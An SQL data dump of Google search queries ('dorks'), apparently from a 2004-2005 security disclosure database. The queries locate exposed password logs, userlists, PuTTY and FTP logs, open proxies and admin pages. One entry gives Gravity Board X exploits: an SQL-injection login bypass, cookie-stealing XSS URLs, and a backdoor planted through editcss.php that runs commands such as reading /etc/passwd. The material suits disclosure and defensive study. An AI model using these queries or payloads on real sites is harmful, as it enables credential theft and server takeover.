(116, 'inurl:ManyServers.htm', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Amanyservers.htm', 1859, '2004-03-04', 'Microsoft Terminal Services Multiple Clients pages. These pages are not necessarily insecure, sine many layers of security can be wrapped around the actual use of this service, but simply being able to find these in Google gives hackers an informational advantage, and many of the sites are not implemented securely.', '2004-03-04', NULL, NULL),
(129, 'inurl:admin filetype:asp inurl:userlist', 'http://www.google.com/search?hl=en&lr=lang_en&ie=UTF-8&oe=UTF-8&q=inurl%3Aadmin+filetype%3Aasp+inurl%3Auserlist&btnG=Google+Search', 7257, '2004-03-16', 'This search reveals userlists of administrative importance. Userlists found using this method can range from benign "message group" lists to system userlists containing passwords.', '2004-03-16', NULL, NULL),
(197, '+intext:"webalizer" +intext:"Total Usernames" +intext:"Usage Statistics for"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=Google+for%3A+%2Bintext%3A%22webalizer%22+%2Bintext%3A%22Total+Usernames%22+%2Bintext%3A%22Usage+Statistics+for%22', 6793, '2004-05-03', 'The webalizer program displays various information but this query displays usernames that have logged into the site. Attckers can use this information to mount an attack.', '2004-05-03', NULL, NULL),
(220, 'filetype:reg reg +intext:"internet account manager"', 'http://www.google.com/search?num=100&hl=en&lr=&q=filetype%3Areg+reg+%2Bintext%3A%22internet+account+manager', 10061, '2004-05-12', 'This google search reveals users names, pop3 passwords, email addresses, servers connected to and more. The IP addresses of the users can also be revealed in some cases.', '2004-05-12', NULL, NULL),
(230, 'filetype:log username putty', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=filetype%3Alog+username+putty', 8670, '2004-05-13', 'These log files record info about the SSH client PUTTY. These files contain usernames, site names, IP addresses, ports and various other information about the SSH server connected to.', '2004-05-13', NULL, NULL),
(231, 'filetype:log inurl:"password.log"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=filetype%3Alog+inurl%3A%22password.log%22', 17009, '2004-05-13', 'These files contain cleartext usernames and passwords, as well as the sites associated with those credentials. Attackers can use this information to log on to that site as that user.', '2004-05-13', NULL, NULL),
(246, '+htpasswd +WS_FTP.LOG filetype:log', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%2Bhtpasswd+%2BWS_FTP.LOG+filetyp', 4512, '2004-05-20', 'WS_FTP.LOG can be used in many ways to find more information about a server. This query is very flexible, just substitute "+htpasswd" for "+FILENAME" and you may get several hits that you hadn''t seen with the ''normal'' search. Filenames suggested by the forum to explore are: phpinfo, admin, MySQL, password, htdocs, root, Cisco, Oracle, IIS, resume, inc, sql, users, mdb, frontpage, CMS, backend, https, editor, intranet . The list goes on and on..A different approach might be "allinurl: "some.host.com" WS_FTP.LOG filetype:log" which tells you more about who''s uploading files to a specific site.', '2004-05-20', NULL, NULL),
(264, 'intitle:"album permissions" "Users who can modify photos" "EVERYBODY"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22album+permissions%22+%22Users+who+can+modify+photos%22+%22EVERYBODY%22&btnG=Search', 2856, '2004-06-02', 'Gallery (http://gallery.menalto.com) is software that allows users to create webalbums and upload pictures to it. In some installations Gallery lets you access the Admin permission page album_permissions.php without authentication. Even if not "everybody" has modify rights, an attacker can do a search for "users who can see the album" to retrieve valid usernames for the gallery.', '2004-06-02', NULL, NULL),
(360, 'fitweb-wwws * server at intitle:index.of', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=fitweb-wwws+*+server+at+intitle%3Aindex.of&btnG=Search', 1627, '2004-07-19', 'The version of a particular web server can be detected with a simple query like this one. Although the same thing can be accomplished by browsing the web site, this method offers another layer of anonymity. Armed with this information an attacker can plan an attack with more precision.', '2004-07-19', NULL, NULL),
(466, 'inurl:"nph-proxy.cgi" "Start browsing through this CGI-based proxy"', 'http://www.google.com/search?q=inurl:%22nph-proxy.cgi%22+%22Start+browsing+through+this+CGI-based+proxy%22&hl=en&lr=&ie=UTF-8&filter=0', 6191, '2004-09-09', 'Observing the web cracker in the wild, one feels like they are watching a bear. Like a bear stocks up on food and then hibernates, a web cracker must stock up on proxies, and then hack until they run out.Web crackers are a distinct breed, and many do not comfort well with the draconian measures that many other crackers take, such as port and service scanning, the modern web cracker finds such tactics much too intrusive. This leaves the web cracker with the only viable option to come in contact with a large number of proxies being to use public proxy lists. These are of course very slow, and very very unstable, and do not allow the cracker much time between his proxy runs.Luckily google gives them another option, if they are smart enough to find it.CGI-proxy ( http://www.jmarshall.com/tools/cgiproxy/ ) is a CGI-based proxy application. It runs on a web server, and acts as an http proxy, in CGI form. A prudent site owner would hide it behind .htaccess, as most do, but with a powerful tool like google, the inprudent few who leave it open can quickly be seperated from the wise masses.CGI-proxy''s default page contains the text, as you can see in the demo on their site:"Start browsing through this CGI-based proxy by entering a URL below. Only HTTP and FTP URLs are supported. Not all functions will work (e.g. some JavaScript), but most pages will be fine."The proxy as it resides on a server is most often called nph-proxy.cgi. A web cracker can now use google to enumerate his list of proxy servers, like so:inurl:"nph-proxy.cgi" "Start browsing through this CGI-based proxy"More results can be obtained by admitting the "inurl:nph-proxy.cgi" constraint, but much more trash is generated as well.', '2004-09-09', NULL, NULL),
(610, '(inurl:81/cgi-bin/.cobalt/) | (intext:"Welcome to the Cobalt RaQ")', 'http://www.google.com/search?hl=en&lr=&client=firefox-a&q=%28inurl%3A81%2Fcgi-bin%2F.cobalt%2F%29++%7C+%28intext%3A%22Welcome+to+the+Cobalt+RaQ%22+%29&btnG=Search', 3598, '2004-10-22', 'The famous Sun linux appliance. The default page displays this text:"Congratulations on Choosing a Cobalt RaQ - the premier server appliance platform for web hosting. This page can easily be replaced with your own page. To replace this page, transfer your new content to the directory /home/sites/home/web".', '2004-10-22', NULL, NULL),
(821, 'filetype:torrent torrent', 'http://www.google.com/search?hl=en&q=filetype%3Atorrent+torrent', 4108, '2005-01-16', 'Torrent files .. don''t expect to find spectacular stuff with this kind of string, this just to shows you can use Google for all kinds of filetypes, not just pdf or html..', '2005-01-16', NULL, NULL),
(965, 'intitle:"YALA: Yet Another LDAP Administrator"', 'http://www.google.com/search?q=intitle%3A%22YALA%3A+Yet+Another+LDAP+Administrator%22&btnG=Search', 4257, '2005-05-02', 'YALA is a web-based LDAP administration GUI. The idea is to simplify the directory administration with a graphical interface and neat features, though to stay a general-purpose programThe goal is to simplify the administration but not to make the YALA user stupid: to achieve this, we try to show the user what YALA does behind the scenes, what it sends to the server', '2005-05-02', NULL, NULL),
(1051, '"Powered by Gravity Board"', 'http://www.google.com/search?hl=it&q=%22Powered+by+Gravity+Board%22&btnG=Cerca+con+Google&meta=', 1967, '2005-08-07', '4.22 07/08/2005 Gravity Board X v1.1 (possibly prior versions) Remote code execution, SQL Injection / Login Bypass, cross site scripting, path disclosure poc software: author site: http://www.gravityboardx.com/ a) Sql Injection / Login Bypass: If magic_quotes off, A user can bypass login check and grant administrator privileges on target system: login: '' or isnull(1/0) /* password: whatever b) Cross site scripting poc: b.1)After he login as administrator he can edit template to insert evil javascript code. Try to insert at the end of the template these lines:  alert(document.cookie) b.2)A user can craft a malicious url like this to access target user cookies: http://[target]/[path]/deletethread.php?board_id="&gt;alert(document.cookie) c) Remote commands/php code execution: c.1) Always editing the template, attacker can leave a backdoor in target system, example, at the end of template:   After, the attacker can launch commands by this urls: http://[target]/[path]/index.php?cmd=ls%20-la            to list directories... http://[target]/[path]/index.php?cmd=cat%20/etc/passwd to see Unix /etc/passwd file http://[target]/[path]/index.php?cmd=cat%20config.php to see database username/password c.2) An IMPORTANT NOTE: You can edit template without to be logged in as administator, calling editcss.php script, look at the code of this script: if($fp = fopen(''gbxfinal.css'',''w'')){ fwrite($fp, $csscontent); fclose($fp); echo ''''; }else{ echo ''Gravity Board X was unable to save changes to the CSS template.''; } you can easily deface the forum and/or insert a backdoor calling an url like this: http://[target]/[path]/editcss.php?csscontent= then execute commands: http://[target]/[path]/index?cmd=[command] It''s also possible to disclose path: d) path disclosure: http://[target]/[path]/deletethread.php?perm=1 http://[target]/[path]/ban.php http://[target]/[path]/addnews.php http://[target]/[path]/banned.php http://[target]/[path]/boardstats.php http://[target]/[path]/adminform.php http://[target]/[path]/forms/admininfo.php http://[target]/[path]/forms/announcements.php http://[target]/[path]/forms/banform.php ans so on...calling scripts in /forms directory', '2005-08-07', NULL, NULL),
(1106, 'intitle:guestbook inurl:guestbook "powered by Advanced guestbook 2.*" "Sign the Guestbook"', 'http://www.google.com/search?q=intitle:guestbook+inurl:guestbook+%22powered+by++Advanced+guestbook+2.*%22+%22Sign+the+Guestbook%22&hl=en&lr=&c2coff=1&safe=off&filter=0', 5934, '2005-09-13', 'Advanced Guestbook is prone to an HTML injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.http://secunia.com/product/4356/http://www.packetalarm.com/sec_notices/index.php?id=2209&amp;delimit=1#detail', '2005-09-13', NULL, NULL),
(1107, 'intitle:"Backup-Management (phpMyBackup v.0.4 beta * )" -johnny.ihackstuff', 'http://www.google.com/search?q=intitle:%22Backup-Management+(phpMyBackup+v.0.4+beta+*+)%22+-johnny.ihackstuff&num=100&filter=0', 4466, '2005-09-13', 'phpMyBackup is an mySQL backup tool, with features like copying backups to a different server using FTP.', '2005-09-13', NULL, NULL),
